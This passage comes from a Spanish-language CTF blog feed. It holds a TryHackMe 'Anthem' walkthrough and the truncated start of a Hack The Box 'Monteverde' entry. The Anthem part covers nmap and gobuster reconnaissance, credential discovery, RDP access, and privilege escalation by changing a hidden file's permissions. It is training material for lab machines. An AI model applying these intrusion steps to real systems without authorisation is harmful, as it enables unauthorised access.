&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sat Jun 20 18:56:03 2020 as: nmap -sV -o nmap_scan_mini anthem.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; anthem.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.109.143&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.19s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;995&lt;/span&gt; closed ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sat Jun 20 18:58:39 2020 -- 1 IP address (1 host up) scanned in 156.11 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sat Jun 20 20:27:23 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan anthem.thm&lt;/span&gt;
Warning: 10.10.194.228 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;6&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; anthem.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.194.228&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.18s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65520&lt;/span&gt; closed ports
PORT      STATE    SERVICE       VERSION
80/tcp    open     http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-robots.txt: &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; disallowed entries 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_/bin/ /config/ /umbraco/ /umbraco_client/
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Anthem.com - Welcome to our blog
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds?
3389/tcp  open     ms-wbt-server Microsoft Terminal Services
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; rdp-ntlm-info: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Target_Name: WIN-LU09299160F
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   NetBIOS_Domain_Name: WIN-LU09299160F
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   NetBIOS_Computer_Name: WIN-LU09299160F
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   DNS_Domain_Name: WIN-LU09299160F
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   DNS_Computer_Name: WIN-LU09299160F
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Product_Version: 10.0.17763
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  System_Time: 2020-06-21T01:45:48+00:00
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;WIN-LU09299160F
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2020-04-04T22:56:38
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2020-10-04T22:56:38
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: 2020-06-21T01:45:58+00:00&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 0s from scanner time.
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
20106/tcp filtered unknown
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49669/tcp open     msrpc         Microsoft Windows RPC
49670/tcp open     msrpc         Microsoft Windows RPC
49671/tcp open     msrpc         Microsoft Windows RPC
Service Info: OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled but not required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2020-06-21T01:45:49
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sat Jun 20 20:45:59 2020 -- 1 IP address (1 host up) scanned in 1116.48 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anthem/Screenshot_20200620_180458.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/anthem# gobuster dir -u http://anthem.thm -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -x php,html,txt 
/Archive &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/archive &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/authors &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Blog &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/blog &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/categories &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/install &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/rss &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/RSS &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/search &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Search &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/sitemap &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/SiteMap &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/tags &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/umbraco &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos en el archivo &lt;code&gt;robots.txt&lt;/code&gt; direcciones que no aparecen en GOBUSTER, además encontramos una frase que posiblemente sea util.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anthem/Screenshot_20200620_181528.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Visitamos &lt;code&gt;/umbranco&lt;/code&gt; y encontramos un panel de inicio de sesion, pero aun no tenemos credenciales.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anthem/Screenshot_20200620_214422.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En uno de los Posts de la pagina, encontramos un correo, que nos podria servir para encontrar otros.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anthem/Screenshot_20200620_194403.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Intentamos utilizar el correo junto a la frase que encontramos pero no funcionó en &lt;code&gt;/umbranco&lt;/code&gt;. En una de las pistas del CTF nos dice que utilicemos nuestro buscador favorito, pero ¿qué vamos a buscar?.&lt;/p&gt;
&lt;p&gt;Dentro de uno de los posts encontramos un poema, al buscar este poema en internet encontramos un nombre del que parece ser el autor de este.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anthem/Screenshot_20200620_194848.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Autor&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anthem/Screenshot_20200620_194912.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;unbranco&#34;&gt;UNBRANCO&lt;/h2&gt;
&lt;p&gt;Con esto, logramos encontrar el nombre del administrador y el correo (con el patron Jose Lopez -&amp;gt; &lt;code&gt;JL@dominio.com&lt;/code&gt;). Intentamos utilizar el correo con la frase encontrada en &lt;code&gt;/umbranco&lt;/code&gt; y logramos obtener acceso.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anthem/Screenshot_20200620_195251.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;La version de &lt;code&gt;Umbraco es 7.15.4&lt;/code&gt; por lo que no encontramos un exploit que pudiera ayudarnos a tener acceso en la maquina.&lt;/p&gt;
&lt;h2 id=&#34;rdp---user&#34;&gt;RDP - USER&lt;/h2&gt;
&lt;p&gt;Intentamos mediante el servicio RDP con las credenciales y logramos acceder mediante este.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Instalacion de Remmina:&lt;/em&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;apt install remmina
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anthem/Screenshot_20200620_202620.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener una sesion y la flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anthem/Screenshot_20200620_202734.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;administrator---user&#34;&gt;ADMINISTRATOR - USER&lt;/h2&gt;
&lt;p&gt;Teniendo una sesion en la maquina buscamos informacion que pudiera ayudarnos a escalar privilegios, no encontramos binarios, archivos o servicios en los cuales apoyarnos. Pero, al revisar las carpetas nos damos cuenta que no esta activada la opcion de que permite ver archivos ocultos. La activamos y encontramos un archivo en el directorio principal del disco.&lt;/p&gt;
&lt;p&gt;Al intentar abrir el archivo nos muestra un mensaje de que no tenemos permisos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anthem/Screenshot_20200620_204537.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos las propiedades del archivo y vemos que no tiene ningun grupo o usuario permitido escribir, leer o modificar. Agregamos nuestro usuario al archivo. Escribimos el nombre de nuestro usuario y damos &lt;code&gt;Check Names&lt;/code&gt; y automaticamente lo agrega con el nombre del equipo.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anthem/Screenshot_20200620_204848.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Aplicamos y vemos que nuestro usuario tiene todos los permisos permitidos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anthem/Screenshot_20200620_204938.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Abrimos el archivo, logramos leer el archivo y vemos una frase dentro.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anthem/Screenshot_20200620_205031.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Agregamos una nueva conexion al servicio RDP pero con el usuario administrator y con la frase que encontramos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anthem/Screenshot_20200620_205209.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener una sesion y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anthem/Screenshot_20200620_205547.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;flags-extra&#34;&gt;FLAGS EXTRA&lt;/h2&gt;
&lt;h3 id=&#34;flag-1&#34;&gt;FLAG 1&lt;/h3&gt;
&lt;p&gt;La encontramos en el primer post.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anthem/Screenshot_20200620_210358.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;flag-2&#34;&gt;FLAG 2&lt;/h3&gt;
&lt;p&gt;La flag la encontramos en el codigo fuente de la pagina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anthem/Screenshot_20200620_180900.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;flag-3&#34;&gt;FLAG 3&lt;/h3&gt;
&lt;p&gt;La encontramos en el perfil de Jane Doe.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anthem/Screenshot_20200620_191046.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;flag-4&#34;&gt;FLAG 4&lt;/h3&gt;
&lt;p&gt;Encontramos la flag en el segundo post.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/anthem/Screenshot_20200620_191732.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/anthem/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/anthem/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>windows</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Monteverde</title>
        <link>https://sckull.github.io/posts/monteverde/</link>
        <pubDate>Sat, 13 Jun 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 13 Jun 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/monteverde/</guid>
        <description>Monteverde es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Monteverde es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/monteverde/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Monteverde&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.172&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/1190&#34;&gt;egre55&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp/udp y servicios con nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
